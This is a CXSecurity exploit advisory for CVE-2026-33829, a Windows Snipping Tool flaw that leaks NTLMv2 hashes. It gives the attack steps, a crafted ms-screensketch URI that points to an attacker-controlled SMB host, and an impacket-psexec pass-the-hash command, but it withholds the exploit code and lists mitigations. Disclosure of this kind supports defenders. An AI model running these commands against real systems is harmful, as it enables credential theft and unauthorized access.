---
title: Windows Snipping Tool NTLMv2 Hash Hijack
url: https://cxsecurity.com/issue/WLB-2026050011
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-05-19
fetch_date: 2026-05-20T05:58:33.371346
---

# Windows Snipping Tool NTLMv2 Hash Hijack

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Windows Snipping Tool NTLMv2 Hash Hijack** **2026.05.19**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-33829](https://cxsecurity.com/cveshow/CVE-2026-33829/ "Click to see CVE-2026-33829")**  CWE: **N/A** | |

# Exploit Title: Windows Snipping Tool - NTLMv2 Hash Hijack
# Date: 2026-04-22
# Exploit Author: nu11secur1ty
# Video Demo: https://www.patreon.com/posts/cve-2026-33829-156243398
# Vendor Homepage: https://www.microsoft.com
# Software Link: Built-in Windows Snipping Tool
# Version: Windows 10, Windows 11, Windows Server 2012-2025 (pre-April 2026
patch)
# Tested on: Windows 11 Pro (Build 22621) / Kali Linux 2026.1
# CVE: CVE-2026-33829
# Attack Type: Remote / Network-based
# Impact: Credential Theft (NTLMv2 Hash) / Pass-the-Hash
# CVSS Score: 4.3 (Medium) but HIGH impact in practice
## Vulnerable Systems
- Windows 10 (all versions before April 14, 2026 patch)
- Windows 11 (all versions before April 14, 2026 patch)
- Windows Server 2012, 2016, 2019, 2022, 2025 (before April 14, 2026 patch)
## Description
A vulnerability in Windows Snipping Tool (CVE-2026-33829) allows attackers
to
force NTLMv2 authentication to a remote SMB server via crafted
ms-screensketch:edit
URI. When a victim clicks a malicious link and approves the "Open Snipping
Tool"
prompt, Windows automatically sends the user's NTLMv2 hash to the
attacker-controlled
server. This exploit extends beyond the original PoC by also harvesting
HTTP NTLM
hashes (via WPAD), LLMNR, and MDNS poisoning - capturing MULTIPLE valid
hashes from
a SINGLE click. Captured hashes can be used for Pass-the-Hash attacks or
cracked
with Hashcat.
## Exploit Features (nu11secur1ty edition)
- ✅ Snipping Tool NTLM hash capture (original vector)
- ✅ Automatic HTTP NTLM authentication capture (additional vector)
- ✅ WPAD poisoning (automatic proxy config)
- ✅ LLMNR/MDNS poisoning (fallback vectors)
- ✅ Multi-harvest - captures multiple hashes from one click
- ✅ One-command execution (sudo python3 exploit.py)
- ✅ Auto-detects terminal and opens Responder in new window
- ✅ Built-in HTTP server for HTML delivery
## Proof of Concept
\*\*Video Demonstration (Patreon Exclusive):\*\*
https://www.patreon.com/posts/cve-2026-33829-156243398
1. Run exploit on attacker machine (Kali Linux):
sudo python3 CVE-2026-33829-NTLMv2-Hash-Hijack.py
2. Victim (Windows 11) opens the malicious URL:
http://<ATTACKER\_IP>/exploit.html
3. Victim clicks the button and approves "Open Snipping Tool"
4. Attacker captures NTLMv2 hash(es):
[HTTP] NTLMv2 Username : \Hacked
[HTTP] NTLMv2 Hash : Hacked:::157e1f851f7c17e7:16D87BC0AD284FB6...
5. Attacker performs Pass-the-Hash to gain access:
impacket-psexec -hashes :<HASH> Hacked@<VICTIM\_IP>
## Attack Vector
ms-screensketch:edit?filePath=\\<ATTACKER\_IP>\test\evil.png
## Requirements
Attacker: Kali Linux (or any Linux with Python3, impacket, responder)
Victim: Windows 10/11 with Snipping Tool (unpatched)
## Mitigations
- Apply Microsoft patch from April 14, 2026
- Block outbound SMB traffic (port 445)
- Disable NTLMv1 and restrict NTLMv2 via GPO
- Educate users not to click "Open Snipping Tool" prompts from untrusted
sources
## References
- https://cybersecuritynews.com/windows-snipping-tool-vulnerability/
- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-33829
-
https://github.com/blackarrowsec/redteam-research/tree/master/CVE-2026-33829
## Exploit Code (NFO)
The exploit will not be published for security reasons! For more
information, please get in touch with me!
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstorm.news/
https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
0day Exploit DataBase https://0day.today/
home page: https://www.asc3t1c-nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <http://nu11secur1ty.com/>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026050011)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top